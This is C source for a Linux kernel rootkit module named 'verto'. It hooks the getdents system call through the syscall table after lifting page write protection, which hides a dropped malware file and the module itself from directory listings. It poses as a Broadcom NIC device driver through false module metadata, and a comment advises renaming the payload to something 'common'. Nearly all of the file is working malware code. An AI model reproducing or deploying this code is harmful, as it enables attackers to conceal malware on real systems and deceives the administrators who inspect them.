//Neccessary header files
#include <linux/init.h> //macros
#include <linux/module.h> 
#include <linux/syscalls.h>
#include <linux/kallsyms.h> //Call system
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>
#include <linux/kernel.h> //Kernel 


//Assists with kernel taint warnings etc
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Broadcom");
MODULE_DESCRIPTION("NIC Device Driver");
MODULE_VERSION("1.0");


unsigned long **SYS_CALL_TABLE;

/*
//Depricated as of kernel 5.0.3.:: 
void EnablePageWriting(void){
	write_cr0(read_cr0() & (~0x10000));

} 
void DisablePageWriting(void){
	write_cr0(read_cr0() | 0x10000);

} 
*/

//Adaptation for 5.0.3.42 and lower (CR4 pinning and CR0 bypass)
void EnablePageWriting(unsigned long address){
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);

	if(pte->pte &~ _PAGE_RW){
		pte->pte |= _PAGE_RW;
	}
}

void DisablePageWriting(unsigned long address){
	unsigned int level;

	pte_t *pte = lookup_address(address, &level);

	pte->pte = pte->pte &~ _PAGE_RW;

} 


struct linux_dirent {
	unsigned long	  d_ino;    /* Inode number */
	unsigned long	  d_off;	  /* Offset to next linux_dirent */
	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
	char		      d_name[];   // the struct value is actually longer than this, and d_name is variable width.
}*dirp2 , *dirp3 , *retn;   // // dirp = directory pointer -> Utility pointers


//      ------ MALWARE DROP & Verto file hides ------ //

//Hardcoded malware package
char payload[]="malware_demo_file.py"; //Rename to something 'common'

// ------------------------------ //

// ------- HIDE ROOTKIT FILE -------- //

char ko_fl[]  = "verto.ko";

//-- NOTES: We dont need to hide these because they are not necessary to the running of the module -- //

    //char mod_of[] = "modules.order";
    //char mod_vf[] = "Module.symvers";
    //char mod_f[]  = "verto.mod.o";
    //char out_f[]  = "verto.o";
    //char mod_c[]  = "verto.mod.c";

// ------------------------------ //


//Original getdents syscall from kernel files (aka kallsym {'call system'})
asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count); 

//modified open sys call -> copy dirp (directory pointer) to kernel space
    /*
        -- HOW THIS HIDE FUNCTION WORKS --

            ~> Hook the call for the read/open command
            ~> Point it to directory traversal code
                ~> Uses byte calculations to determine how many resources (represented by structures ) are in dir
            ~> Once it reaches the file to be hidden 
                ~> it 'skips' it and performs the byte arithmatic to continue normally
                ~> displaying everything else in the 

    */
  
asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

  struct linux_dirent *retn, *dirp3; 
  int Records, RemainingBytes, length;

  Records = (*original_getdents) (fd, dirp, count);

  if (Records <= 0){
    return Records;
  }

  retn = (struct linux_dirent *) kmalloc(Records, GFP_KERNEL);
  //Copy struct from userspace to our memspace in kernel space
  copy_from_user(retn, dirp, Records);

  dirp3 = retn; //Holds directory pointer for current dir, used to iterate over
  RemainingBytes = Records;
  
    //While still stuff in the dir
  while(RemainingBytes > 0){
    length = dirp3->d_reclen; //len of record
    RemainingBytes -= dirp3->d_reclen; //Gives numerical representation of next struct
    
    //Debbugging
    printk(KERN_INFO "RemainingBytes %d   \t File: %s " ,  RemainingBytes , dirp3->d_name );

    /* TEMPLATE IF
    if((strcmp( (dirp3->d_name) , hide) == 0)){
      memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, RemainingBytes);
      Records -= length; //  dirp3->d_reclen; // leads to mistake?
    }
    */
    if((strcmp( (dirp3->d_name) , payload) == 0) || (strcmp( (dirp3->d_name) , ko_fl) == 0)){
        memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, RemainingBytes);
        Records -= length; //  replaces dirp3->d_reclen;
    }

    //Shift pointer to next structure (file)
    dirp3 = (struct linux_dirent *) ((char *)dirp3 + dirp3->d_reclen);

  }
  // Copy the record back to the origional struct
  copy_to_user(dirp, retn, Records); //Return to user space (using copy_to_user macro)
  kfree(retn); //Free memory
  return Records;
}


// Set up hooks.
static int __init SetHooks(void) {
	// Gets Syscall Table **
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 

	printk(KERN_INFO "Hooks Will Be Set.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);

  // Opens the memory pages to be written
	EnablePageWriting((unsigned long )SYS_CALL_TABLE);

  // Replaces Pointer Of Syscall_open on our syscall.
	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)HookGetDents;
	DisablePageWriting((unsigned long )SYS_CALL_TABLE);

	return 0;
}







static void __exit HookCleanup(void) {

	// Clean up our Hooks
	EnablePageWriting((unsigned long )SYS_CALL_TABLE);
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;
	DisablePageWriting((unsigned long )SYS_CALL_TABLE);
	printk(KERN_INFO "Hooks cleaned up");
}

module_init(SetHooks);
module_exit(HookCleanup);